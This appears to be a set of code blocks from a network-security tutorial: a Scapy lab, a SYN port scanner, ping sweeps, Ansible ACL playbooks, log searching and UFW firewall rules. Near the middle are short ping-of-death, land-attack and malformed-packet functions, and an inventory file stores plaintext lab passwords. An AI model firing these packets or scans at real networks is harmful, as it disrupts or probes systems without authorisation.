["```py\nubuntu@client:~$ lsb_release -a\nNo LSB modules are available.\nDistributor ID:\tUbuntu\nDescription:\tUbuntu 18.04.3 LTS\nRelease:\t18.04\nCodename:\tbionic \n```", "```py\nubuntu@client:~$ ip link\n1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN mode DEFAULT group default qlen 1000\n    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\n2: ens2: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP mode DEFAULT group default qlen 1000\n    link/ether 52:54:00:1e:bc:51 brd ff:ff:ff:ff:ff:ff\n3: ens3: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP mode DEFAULT group default qlen 1000\n    link/ether 52:54:00:19:54:b5 brd ff:ff:ff:ff:ff:ff\nubuntu@ubuntu:~$ sudo ifconfig ens3 up \n```", "```py\nubuntu@ubuntu:/etc/netplan$ cd /etc/netplan/\nubuntu@ubuntu:/etc/netplan$ cp 50-cloud-init.yaml 50-cloud-init.yaml.bak \nubuntu@ubuntu:/etc/netplan$ sudo rm 50-cloud-init.yaml\nubuntu@ubuntu:/etc/netplan$ sudo touch 50-cloud-init.yaml \n```", "```py\nubuntu@client:~$ cat /etc/netplan/50-cloud-init.yaml \n```", "```py\nnetwork:\n  version: 2\n  renderer: networkd\n  ethernets:\n    ens3:\n      dhcp4: no\n      dhcp6: no\n      addresses: [192.168.2.152/24]\n      gateway4: 192.168.2.1\n      nameservers:\n        addresses: [192.168.2.1,8.8.8.8]\n    ens2:\n      dhcp4: no\n      dhcp6: no\n      addresses: [10.0.0.5/30] \n```", "```py\nubuntu@ubuntu:/etc/netplan$ sudo netplan apply \n```", "```py\nubuntu@server:~$ ip link\n1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN mode DEFAULT group default qlen 1000\n    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\n2: ens2: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP mode DEFAULT group default qlen 1000\n    link/ether 52:54:00:12:9c:5f brd ff:ff:ff:ff:ff:ff\n3: ens3: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP mode DEFAULT group default qlen 1000\n    link/ether 52:54:00:0e:f7:ab brd ff:ff:ff:ff:ff:ff\nubuntu@server:~$ cat /etc/netplan/50-cloud-init.yaml \n```", "```py\nnetwork:\n  version: 2\n  renderer: networkd\n  ethernets:\n    ens3:\n      dhcp4: no\n      dhcp6: no\n      addresses: [192.168.2.153/24]\n      gateway4: 192.168.2.1\n      nameservers:\n        addresses: [192.168.2.1,8.8.8.8]\n    ens2:\n      dhcp4: no\n      dhcp6: no\n      addresses: [10.0.0.9/30] \n```", "```py\nnyc-cor-r1# config t\nEnter configuration commands, one per line.  End with CNTL/Z.\nnyc-cor-r1(config)# int ethernet 2/4\nnyc-cor-r1(config-if)# ip add 10.0.0.6/24\nnyc-cor-r1(config-if)# ip router ospf 200 area 0.0.0.200\nnyc-cor-r1(config-if)# no shut\nnyc-cor-r1(config-if)# end\nnyc-cor-r1# ping 10.0.0.5\nPING 10.0.0.5 (10.0.0.5): 56 data bytes\n36 bytes from 10.0.0.6: Destination Host Unreachable\nRequest 0 timed out\n64 bytes from 10.0.0.5: icmp_seq=1 ttl=63 time=4.888 ms\n64 bytes from 10.0.0.5: icmp_seq=2 ttl=63 time=2.11 ms\n64 bytes from 10.0.0.5: icmp_seq=3 ttl=63 time=2.078 ms\n64 bytes from 10.0.0.5: icmp_seq=4 ttl=63 time=0.965 ms\n^C\n--- 10.0.0.5 ping statistics ---\n5 packets transmitted, 4 packets received, 20.00% packet loss\nround-trip min/avg/max = 0.965/2.51/4.888 ms\nnyc-cor-r1# \n```", "```py\nnyc-edg-r1#confi t\nEnter configuration commands, one per line.  End with CNTL/Z.\nnyc-edg-r1(config)#int gig 0/2\nnyc-edg-r1(config-if)#ip add 10.0.0.10 255.255.255.252\nnyc-edg-r1(config-if)#no shut\nnyc-edg-r1(config-if)#end\nnyc-edg-r1#ping 10.0.0.9\nType escape sequence to abort.\nSending 5, 100-byte ICMP Echos to 10.0.0.9, timeout is 2 seconds:\n.!!!!\nSuccess rate is 80 percent (4/5), round-trip min/avg/max = 1/3/7 ms\nnyc-edg-r1#\nnyc-edg-r1#confi t\nEnter configuration commands, one per line.  End with CNTL/Z.\nnyc-edg-r1(config)#router ospf 200\nnyc-edg-r1(config-router)#net\nnyc-edg-r1(config-router)#network 10.0.0.8 0.0.0.3 area 200\nnyc-edg-r1(config-router)#end\nnyc-edg-r1# \n```", "```py\nubuntu@client:~$ route -n\nKernel IP routing table\nDestination     Gateway         Genmask         Flags Metric Ref    Use Iface\n0.0.0.0         192.168.2.1     0.0.0.0         UG    0      0        0 ens3\n10.0.0.4        0.0.0.0         255.255.255.252 U     0      0        0 ens2\n192.168.2.0     0.0.0.0         255.255.255.0   U     0      0        0 ens3 \n```", "```py\nubuntu@client:~$ sudo route add -net 10.0.0.8/30 gw 10.0.0.6\nubuntu@client:~$ route -n\nKernel IP routing table\nDestination     Gateway         Genmask         Flags Metric Ref    Use Iface\n0.0.0.0         192.168.2.1     0.0.0.0         UG    0      0        0 ens3\n10.0.0.4        0.0.0.0         255.255.255.252 U     0      0        0 ens2\n10.0.0.8        10.0.0.6        255.255.255.252 UG    0      0        0 ens2\n192.168.2.0     0.0.0.0         255.255.255.0   U     0      0        0 ens3 \n```", "```py\nubuntu@server:~$ sudo route add -net 10.0.0.4/30 gw 10.0.0.10\nubuntu@server:~$ route -n\nKernel IP routing table\nDestination     Gateway         Genmask         Flags Metric Ref    Use Iface\n0.0.0.0         192.168.2.1     0.0.0.0         UG    0      0        0 ens3\n10.0.0.4        10.0.0.10       255.255.255.252 UG    0      0        0 ens2\n10.0.0.8        0.0.0.0         255.255.255.252 U     0      0        0 ens2\n192.168.2.0     0.0.0.0         255.255.255.0   U     0      0        0 ens3 \n```", "```py\n# Install on both client and server\nubuntu@ubuntu:~$ sudo apt install traceroute\n# From Server to Client\nubuntu@server:~$ ping -c 1 10.0.0.5\nPING 10.0.0.5 (10.0.0.5) 56(84) bytes of data.\n64 bytes from 10.0.0.5: icmp_seq=1 ttl=62 time=3.38 ms\n--- 10.0.0.5 ping statistics ---\n1 packets transmitted, 1 received, 0% packet loss, time 0ms\nrtt min/avg/max/mdev = 3.388/3.388/3.388/0.000 ms\nubuntu@server:~$ traceroute 10.0.0.5\ntraceroute to 10.0.0.5 (10.0.0.5), 30 hops max, 60 byte packets\n 1  10.0.0.10 (10.0.0.10)  2.829 ms  5.832 ms  7.396 ms\n 2  * * *\n 3  10.0.0.5 (10.0.0.5)  11.458 ms  11.459 ms  11.744 ms\n# From Client to Server\nubuntu@client:~$ ping -c 1 10.0.0.9\nPING 10.0.0.9 (10.0.0.9) 56(84) bytes of data.\n64 bytes from 10.0.0.9: icmp_seq=1 ttl=62 time=3.32 ms\n--- 10.0.0.9 ping statistics ---\n1 packets transmitted, 1 received, 0% packet loss, time 0ms\nrtt min/avg/max/mdev = 3.329/3.329/3.329/0.000 ms\nubuntu@client:~$ traceroute 10.0.0.9\ntraceroute to 10.0.0.9 (10.0.0.9), 30 hops max, 60 byte packets\n 1  10.0.0.6 (10.0.0.6)  3.187 ms  3.318 ms  3.804 ms\n 2  * * *\n 3  10.0.0.9 (10.0.0.9)  11.845 ms  12.030 ms  12.035 ms \n```", "```py\n$ sudo apt update && sudo apt upgrade -y \n$ sudo apt install software-properties-common -y\n$ sudo add-apt-repository ppa:deadsnakes/ppa\n$ sudo apt install -y python3.10 python3.10-venv\n$ python3.10 -m venv venv\n$ source venv/bin/activate \n```", "```py\n(venv) ubuntu@[server|client]:~$ git clone https://github.com/secdev/scapy.git\n(venv) ubuntu@[server|client]:~$ cd scapy/\n(venv) ubuntu@[server|client]:~/scapy$ sudo python3 setup.py install\n(venv) ubuntu@[server|client]:~/scapy$ pip install scapy \n```", "```py\n(venv) ubuntu@client:~$ sudo scapy\nâ€¦\n                     aSPY//YASa\n             apyyyyCY//////////YCa       |\n            sY//////YSpcs  scpCY//Pp     | Welcome to Scapy\n ayp ayyyyyyySCP//Pp           syY//C    | Version 2.5.0rc1.dev16\n AYAsAYYYYYYYY///Ps              cY//S   |\n         pCCCCY//p          cSSps y//Y   | https://github.com/secdev/scapy\n         SPPPP///a          pP///AC//Y   |\n              A//A            cyP////C   | Have fun!\n              p///Ac            sC///a   |\n              P////YCpc           A//A   | What is dead may never die!\n       scccccp///pSP///p          p//Y   |                     -- Python 2\n      sY/////////y  caa           S//P   |\n       cayCyayP//Ya              pY/Ya\n        sY/PsY////YCc          aC//Yp\n         sc  sccaCY//PCypaapyCP//YSs\n                  spCPY//////YPSps\n                       ccaacs \n```", "```py\n(venv) ubuntu@client:~$ python3.10\nPython 3.10.7 (main, Sep  7 2022, 15:23:21) [GCC 7.5.0] on linux\nType \"help\", \"copyright\", \"credits\" or \"license\" for more information.\n>>> from scapy.all import *\n>>> exit() \n```", "```py\n## Client Side\nubuntu@client:~/scapy$ sudo scapy\n>>> send(IP(dst=\"10.0.0.9\")/ICMP())\n.\nSent 1 packets.\n# Server side\nubuntu@server:~/scapy$ sudo tcpdump -i ens2\ntcpdump: verbose output suppressed, use -v or -vv for full protocol decode\nlistening on ens2, link-type EN10MB (Ethernet), capture size 262144 bytes\n02:02:24.402707 Loopback, skipCount 0, Reply, receipt number 0, data (40 octets)\n02:02:24.658511 IP 10.0.0.5 > server: ICMP echo request, id 0, seq 0, length 8\n02:02:24.658532 IP server > 10.0.0.5: ICMP echo reply, id 0, seq 0, length 8 \n```", "```py\n>>> p = sr1(IP(dst=\"10.0.0.9\")/ICMP())\nBegin emission:\n.Finished sending 1 packets.\n*\nReceived 2 packets, got 1 answers, remaining 0 packets\n>>> p\n<IP  version=4 ihl=5 tos=0x0 len=28 id=5717 flags= frag=0 ttl=62 proto=icmp chksum=0x527f src=10.0.0.9 dst=10.0.0.5 |<ICMP  type=echo-reply code=0 chksum=0xffff id=0x0 seq=0x0 |<Padding  load='\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00' |>>>\n>>> \n```", "```py\n>>> p = sr(IP(dst=\"10.0.0.9\")/ICMP())\n.Begin emission:\n.....Finished sending 1 packets.\n*\nReceived 7 packets, got 1 answers, remaining 0 packets\n>>> type(p)\n<class 'tuple'> \n```", "```py\n>>> ans, unans = sr(IP(dst=\"10.0.0.9\")/ICMP())\n.Begin emission:\n...Finished sending 1 packets.\n..*\nReceived 7 packets, got 1 answers, remaining 0 packets\n>>> type(ans)\n<class 'scapy.plist.SndRcvList'>\n>>> type(unans)\n<class 'scapy.plist.PacketList'> \n```", "```py\n>>> for i in ans:\n...     print(type(i))\n...\n<class 'scapy.compat.NamedTuple.<locals>._NT'>\n>>>\n>>>\n>>> for i in ans:\n...     print(i)\n...\nQueryAnswer(query=<IP  frag=0 proto=icmp dst=10.0.0.9 |<ICMP  |>>, answer=<IP  version=4 ihl=5 tos=0x0 len=28 id=10871 flags= frag=0 ttl=62 proto=icmp chksum=0x3e5d src=10.0.0.9 dst=10.0.0.5 |<ICMP  type=echo-reply code=0 chksum=0xffff id=0x0 seq=0x0 |<Padding  load='\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00' |>>>) \n```", "```py\n>>> p = sr1(IP(dst=\"8.8.8.8\")/UDP()/DNS(rd=1,qd=DNSQR(qname=\"www.google.com\")))\nBegin emission:\nFinished sending 1 packets.\n......*\nReceived 7 packets, got 1 answers, remaining 0 packets\n>>> p\n<IP  version=4 ihl=5 tos=0x20 len=76 id=20467 flags= frag=0 ttl=58 proto=udp chksum=0x5d3e src=8.8.8.8 dst=192.168.2.152 |<UDP  sport=domain dport=domain len=56 chksum=0xf934 |<DNS  id=0 qr=1 opcode=QUERY aa=0 tc=0 rd=1 ra=1 z=0 ad=0 cd=0 rcode=ok qdcount=1 ancount=1 nscount=0 arcount=0 qd=<DNSQR  qname='www.google.com.' qtype=A qclass=IN |> an=<DNSRR  rrname='www.google.com.' type=A rclass=IN ttl=115 rdlen=4 rdata=142.251.211.228 |> ns=None ar=None |>>>\n>>> \n```", "```py\n>>> a = sniff(filter=\"icmp\", count=5)\n>>> a.show()\n0000 Ether / IP / ICMP 192.168.2.152 > 8.8.8.8 echo-request 0 / Raw\n0001 Ether / IP / ICMP 8.8.8.8 > 192.168.2.152 echo-reply 0 / Raw\n0002 Ether / IP / ICMP 192.168.2.152 > 8.8.8.8 echo-request 0 / Raw\n0003 Ether / IP / ICMP 8.8.8.8 > 192.168.2.152 echo-reply 0 / Raw\n0004 Ether / IP / ICMP 192.168.2.152 > 8.8.8.8 echo-request 0 / Raw \n```", "```py\n>>> for packet in a:\n...     print(packet.show())\n...\n###[ Ethernet ]###\n  dst       = 08:b4:b1:18:01:39\n  src       = 52:54:00:19:54:b5\n  type      = IPv4\n###[ IP ]###\n     version   = 4\n     ihl       = 5\n     tos       = 0x0\n     len       = 84\n     id        = 38166\n     flags     = DF\n     frag      = 0\n     ttl       = 64\n     proto     = icmp\n     chksum    = 0xd242\n     src       = 192.168.2.152\n     dst       = 8.8.8.8\n     \\options   \\\n###[ ICMP ]###\n        type      = echo-request\n        code      = 0\n        chksum    = 0x6596\n        id        = 0x502f\n        seq       = 0x1\n        unused    = ''\n###[ Raw ]###\n           load      = '\\\\xaa7%c\\x00\\x00\\x00\\x00\\\\xb2\\\\xcb\\x01\\x00\\x00\\x00\\x00\\x00\\x10\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\\x1e\\x1f !\"#$%&\\'()*+,-./01234567'\n<skip> \n```", "```py\n>>> p = sr1(IP(dst=\"10.0.0.9\")/TCP(sport=666,dport=23,flags=\"S\"))\nBegin emission:\nFinished sending 1 packets.\n.*\nReceived 2 packets, got 1 answers, remaining 0 packets\n>>> p.show()\n###[ IP ]###\n  version= 4\n  ihl= 5\n  tos= 0x0\n  len= 40\n  id= 14089\n  flags= DF\n  frag= 0\n  ttl= 62\n  proto= tcp\n  chksum= 0xf1b9\n  src= 10.0.0.9\n  dst= 10.0.0.5\n  \\options\\\n###[ TCP ]###\n     sport= telnet\n     dport= 666\n     seq= 0\n     ack= 1\n     dataofs= 5\n     reserved= 0\n     flags= RA\n     window= 0\n     chksum= 0x9911\n     urgptr= 0\n     options= [] \n```", "```py\n>>> p = sr1(IP(dst=\"10.0.0.9\")/TCP(sport=666,dport=22,flags=\"S\")).show()\n###[ IP ]###\n  version= 4\n<skip>\n  proto= tcp\n  chksum= 0x28bf\n  src= 10.0.0.9\n  dst= 10.0.0.5\n  \\options\\\n###[ TCP ]###\n     sport= ssh\n     dport= 666\n     seq= 1671401418\n     ack= 1\n     dataofs= 6\n     reserved= 0\n     flags= SA\n<skip> \n```", "```py\n>>> ans,unans = sr(IP(dst=\"10.0.0.9\")/TCP(sport=666,dport=(20,22),flags=\"S\"))\n>>> for i in ans:\n...     print(i)\n...\nQueryAnswer(query=<IP  frag=0 proto=tcp dst=10.0.0.9 |<TCP  sport=666 dport=ftp_data flags=S |>>, answer=<IP  version=4 ihl=5 tos=0x0 len=40 id=0 flags=DF frag=0 ttl=62 proto=tcp chksum=0x28c3 src=10.0.0.9 dst=10.0.0.5 |<TCP  sport=ftp_data dport=666 seq=0 ack=1 dataofs=5 reserved=0 flags=RA window=0 chksum=0x9914 urgptr=0 |<Padding  load='\\x00\\x00\\x00\\x00\\x00\\x00' |>>>)\nQueryAnswer(query=<IP  frag=0 proto=tcp dst=10.0.0.9 |<TCP  sport=666 dport=ftp flags=S |>>, answer=<IP  version=4 ihl=5 tos=0x0 len=40 id=0 flags=DF frag=0 ttl=62 proto=tcp chksum=0x28c3 src=10.0.0.9 dst=10.0.0.5 |<TCP  sport=ftp dport=666 seq=0 ack=1 dataofs=5 reserved=0 flags=RA window=0 chksum=0x9913 urgptr=0 |<Padding  load='\\x00\\x00\\x00\\x00\\x00\\x00' |>>>)\nQueryAnswer(query=<IP  frag=0 proto=tcp dst=10.0.0.9 |<TCP  sport=666 dport=ssh flags=S |>>, answer=<IP  version=4 ihl=5 tos=0x0 len=44 id=0 flags=DF frag=0 ttl=62 proto=tcp chksum=0x28bf src=10.0.0.9 dst=10.0.0.5 |<TCP  sport=ssh dport=666 seq=4214084277 ack=1 dataofs=6 reserved=0 flags=SA window=29200 chksum=0x4164 urgptr=0 options=[('MSS', 1460)] |<Padding  load='\\x00\\x00' |>>>) \n```", "```py\n>>> ans,unans = sr(IP(dst=\"10.0.0.8/29\")/TCP(sport=666,dport=(22),flags=\"S\"))\n>>> for i in ans:\n...     print(i)\n...\n(<IP  frag=0 proto=tcp dst=10.0.0.14 |<TCP  sport=666 dport=ssh flags=S |>>, <IP  version=4 ihl=5 tos=0x0 len=44 id=7289 flags= frag=0 ttl=64 proto=tcp chksum=0x4a41 src=10.0.0.14 dst=10.0.0.5 |<TCP  sport=ssh dport=666 seq=1652640556 ack=1 dataofs=6 reserved=0 flags=SA window=17292 chksum=0x9029 urgptr=0 options=[('MSS', 1444)] |>>)\n(<IP  frag=0 proto=tcp dst=10.0.0.9 |<TCP  sport=666 dport=ssh flags=S |>>, <IP  version=4 ihl=5 tos=0x0 len=44 id=0 flags=DF frag=0 ttl=62 proto=tcp chksum=0x28bf src=10.0.0.9 dst=10.0.0.5 |<TCP  sport=ssh dport=666 seq=898054835 ack=1 dataofs=6 reserved=0 flags=SA window=29200 chksum=0x9f0d urgptr=0 options=[('MSS', 1460)] |>>)\n(<IP  frag=0 proto=tcp dst=10.0.0.10 |<TCP  sport=666 dport=ssh flags=S |>>, <IP  version=4 ihl=5 tos=0x0 len=44 id=38021 flags= frag=0 ttl=254 proto=tcp chksum=0x1438 src=10.0.0.10 dst=10.0.0.5 |<TCP  sport=ssh dport=666 seq=371720489 ack=1 dataofs=6 reserved=0 flags=SA window=4128 chksum=0x5d82 urgptr=0 options=[('MSS', 536)] |>>)\n>>> \n```", "```py\n#!/usr/bin/env python3\nfrom scapy.all import *\nimport sys\ndef tcp_scan(destination, dport):\n    ans, unans = sr(IP(dst=destination)/TCP(sport=666,dport=dport,flags=\"S\"))\n    for sending, returned in ans:\n        if 'SA' in str(returned[TCP].flags):\n            return destination + \" port \" + str(sending[TCP].dport) + \" is open.\"\n        else:\n            return destination + \" port \" + str(sending[TCP].dport) + \" is not open.\"\ndef main():\n    destination = sys.argv[1]\n    port = int(sys.argv[2])\n    scan_result = tcp_scan(destination, port)\n    print(scan_result)\nif __name__ == \"__main__\":\n    main() \n```", "```py\nubunbu@client:~$ sudo python3 scapy_tcp_scan_1.py \"10.0.0.14\" 22\nBegin emission:\n......Finished sending 1 packets.\n*\nReceived 7 packets, got 1 answers, remaining 0 packets\n10.0.0.14 port 22 is open.\nubuntu@client:~$ sudo python3 scapy_tcp_scan_1.py \"10.0.0.14\" 80\nBegin emission:\n...Finished sending 1 packets.\n*\nReceived 4 packets, got 1 answers, remaining 0 packets\n10.0.0.14 port 80 is not open. \n```", "```py\n#!/usr/bin/env python3\nfrom scapy.all import *\ndef icmp_ping(destination):\n    # regular ICMP ping\n    ans, unans = sr(IP(dst=destination)/ICMP())\n    return ans\ndef tcp_ping(destination, dport):\n    ans, unans = sr(IP(dst=destination)/TCP(dport=dport,flags=\"S\"))\n    return ans\ndef udp_ping(destination):\n    ans, unans = sr(IP(dst=destination)/UDP(dport=0))\n    return ans\ndef answer_summary(ans):\n    for send, recv in ans:\n        print(recv.sprintf(\"%IP.src% is alive\")) \n```", "```py\ndef main():\n    print(\"** ICMP Ping **\")\n    ans = icmp_ping(\"10.0.0.13-14\")\n    answer_summary(ans)\n    print(\"** TCP Ping ***\")\n    ans = tcp_ping(\"10.0.0.13\", 22)\n    answer_summary(ans)\n    print(\"** UDP Ping ***\")\n    ans = udp_ping(\"10.0.0.13-14\")\n    answer_summary(ans)\nif __name__ == \"__main__\":\n    main() \n```", "```py\ndef malformed_packet_attack(host): \n       send(IP(dst=host, ihl=2, version=3)/ICMP()) \n```", "```py\ndef ping_of_death_attack(host):\n    # https://en.wikipedia.org/wiki/Ping_of_death\n    send(fragment(IP(dst=host)/ICMP()/(\"X\"*60000))) \n```", "```py\ndef land_attack(host):\n    # https://en.wikipedia.org/wiki/Denial-of-service_attack \n    send(IP(src=host, dst=host)/TCP(sport=135,dport=135)) \n```", "```py\n[nxosv-devices]\nnyc-cor-r1 \n[iosv-devices]\nnyc-edg-r1 \n```", "```py\n$ cat host_vars/nyc-cor-r1 \n---\nansible_host: 192.168.2.60\nansible_user: cisco\nansible_ssh_pass: cisco\nansible_connection: network_cli\nansible_network_os: nxos\nansbile_become: yes\nansible_become_method: enable\nansible_become_pass: cisco \n```", "```py\n---\n- name: Configure Access List\n  hosts: \"nxosv-devices\"\n  gather_facts: false\n  connection: local\n  vars:\n    cli:\n      host: \"{{ ansible_host }}\"\n      username: \"{{ ansible_username }}\"\n      password: \"{{ ansible_password }}\" \n```", "```py\n tasks:\n    - nxos_acl:\n        name: border_inbound\n        seq: 20\n        action: deny\n        proto: tcp\n        src: 172.16.0.0/12\n        dest: any\n        log: enable\n        state: present\n    - nxos_acl:\n        name: border_inbound\n        seq: 30\n        action: deny\n        proto: tcp\n        src: 192.168.0.0/16\n        dest: any\n        state: present\n        log: enable\n<skip> \n```", "```py\n - name: apply ingress acl to Ethernet 2/4\n      nxos_acl_interface: \n        name: border_inbound\n        interface: Ethernet2/4\n        direction: ingress\n        state: present \n```", "```py\n$ ansible-playbook -i hosts access_list_nxosv.yml \nPLAY [Configure Access List] ******************************************************************************\nTASK [nxos_acl] *******************************************************************************************\nok: [nyc-cor-r1]\n<skip>\nTASK [nxos_acl] *******************************************************************************************\nok: [nyc-cor-r1]\nTASK [apply ingress acl to Ethernet 2/4] ******************************************************************\nchanged: [nyc-cor-r1]\nPLAY RECAP ************************************************************************************************\nnyc-cor-r1                 : ok=7    changed=1    unreachable=0    failed=0    skipped=0    rescued=0    ignored=0   \n<skip> \n```", "```py\nnyc-cor-r1# sh ip access-lists border_inbound\nIP access list border_inbound\n        20 deny tcp 172.16.0.0/12 any log\n        30 deny tcp 192.168.0.0/16 any log\n        40 permit tcp any 10.0.0.9/32 eq 22 log\n        50 permit tcp any 10.0.0.9/32 eq www log\n        60 permit tcp any any established log\n        1000 deny ip any any log\nnx-osv-1# sh run int eth 2/4\n!\ninterface Ethernet2/1\n  description to Client\n  no switchport\n  mac-address fa16.3e00.0001\n  ip access-group border_inbound in\n  ip address 10.0.0.6/30\n  ip router ospf 1 area 0.0.0.0\n  no shutdown \n```", "```py\n<skip>\n tasks:\n    - name: Deny Hosts with vendor id fa16.3e00.0000  \n      ios_config: \n        lines:\n          - access-list 700 deny fa16.3e00.0000 0000.00FF.FFFF\n          - access-list 700 permit 0000.0000.0000 FFFF.FFFF.FFFF\n    - name: Apply filter on bridge group 1\n      ios_config:\n        lines: \n          - bridge-group 1\n          - bridge-group 1 input-address-list 700\n        parents\n          - interface GigabitEthernet0/1 \n```", "```py\n$ ansible-playbook -i hosts access_list_mac_iosv.yml\nTASK [Deny Hosts with vendor id fa16.3e00.0000] ****************************************************************************\nchanged: [nyc-edg-r1]\nTASK [Apply filter on bridge group 1] ***************************************************************************************\nchanged: [nyc-edg-r1] \n```", "```py\nnyc-edg-r1#sh run int gig 0/1\n!\ninterface GigabitEthernet0/1\n description to nyc-cor-r1\n <skip>\n bridge-group 1\n bridge-group 1 input-address-list 700\nend \n```", "```py\n$ wc -l sample_log_anonymized.log\n65102 sample_log_anonymized.log \n```", "```py\n2014 Jun 29 19:20:57 Nexus-7000 %VSHD-5-VSHD_SYSLOG_CONFIG_I: Configured\nfrom vty by admin on console0\n2014 Jun 29 19:21:18 Nexus-7000 %ACLLOG-5-ACLLOG_FLOW_INTERVAL: Src IP:\n10.1 0.10.1,\nDst IP: 172.16.10.10, Src Port: 0, Dst Port: 0, Src Intf: Ethernet4/1, Pro tocol: \"ICMP\"(1), Hit-count = 2589\n2014 Jun 29 19:26:18 Nexus-7000 %ACLLOG-5-ACLLOG_FLOW_INTERVAL: Src IP:\n10.1 0.10.1, Dst IP: 172.16.10.10, Src Port: 0, Dst Port: 0, Src Intf: Ethernet4/1, Pro tocol: \"ICMP\"(1), Hit-count = 4561 \n```", "```py\n#!/usr/bin/env python3\nimport re, datetime\nstartTime = datetime.datetime.now()\nwith open('sample_log_anonymized.log', 'r') as f:\n    for line in f.readlines():\n        if re.search('ACLLOG-5-ACLLOG_FLOW_INTERVAL', line):\n            print(line)\nendTime = datetime.datetime.now()\nelapsedTime = endTime - startTime\nprint(\"Time Elapsed: \" + str(elapsedTime)) \n```", "```py\n$ python3 python_re_search_1.py\n2014 Jun 29 19:21:18 Nexus-7000 %ACLLOG-5-ACLLOG_FLOW_INTERVAL: Src IP: 10.1 0.10.1,\n2014 Jun 29 19:26:18 Nexus-7000 %ACLLOG-5-ACLLOG_FLOW_INTERVAL: Src IP: 10.1 0.10.1,\nTime Elapsed: 0:00:00.047249 \n```", "```py\nsearchTerm = re.compile('ACLLOG-5-ACLLOG_FLOW_INTERVAL') \nwith open('sample_log_anonymized.log', 'r') as f:\nfor line in f.readlines():\nif re.search(searchTerm, line): \n    print(line) \n```", "```py\nTime Elapsed: 0:00:00.081541 \n```", "```py\n$ cp sample_log_anonymized.log sample_log_anonymized_1.log \n```", "```py\nterm1 = re.compile('ACLLOG-5-ACLLOG_FLOW_INTERVAL')\nterm2 = re.compile('PAM: Authentication failure')\nfileList = ['sample_log_anonymized.log', 'sample_log_anonymized_1.log']\nfor log in fileList:\n    with open(log, 'r') as f:\n        for line in f.readlines():\n            if re.search(term1, line) or re.search(term2, line):\n                print(line) \n```", "```py\n$ python3 python_re_search_2.py\n2016 Jun 5 16:49:33 NEXUS-A %DAEMON-3-SYSTEM_MSG: error: PAM:\nAuthentication failure for illegal user AAA from 172.16.20.170 - sshd[4425]\n2016 Sep 14 22:52:26.210 NEXUS-A %DAEMON-3-SYSTEM_MSG: error: PAM:\nAuthentication failure for illegal user AAA from 172.16.20.170 - sshd[2811]\n<skip>\n2014 Jun 29 19:21:18 Nexus-7000 %ACLLOG-5-ACLLOG_FLOW_INTERVAL: Src IP:\n10.1 0.10.1,\n2014 Jun 29 19:26:18 Nexus-7000 %ACLLOG-5-ACLLOG_FLOW_INTERVAL: Src IP:\n10.1 0.10.1,\n<skip>\nTime Elapsed: 0:00:00.330697 \n```", "```py\n$ sudo apt-get install ufw\n$ sudo ufw status\n$ sudo ufw default outgoing\n$ sudo ufw allow 22/tcp\n$ sudo ufw allow www\n$ sudo ufw default deny incoming\nWe can see the status of UFW:\n$ sudo ufw status verbose Status: active\nLogging: on (low)\nDefault: deny (incoming), allow (outgoing), disabled (routed) New profiles: skip\nTo Action From\n-- ------ ----\n22/tcp ALLOW IN Anywhere\n80/tcp ALLOW IN Anywhere\n22/tcp (v6) ALLOW IN Anywhere (v6)\n80/tcp (v6) ALLOW IN Anywhere (v6) \n```"]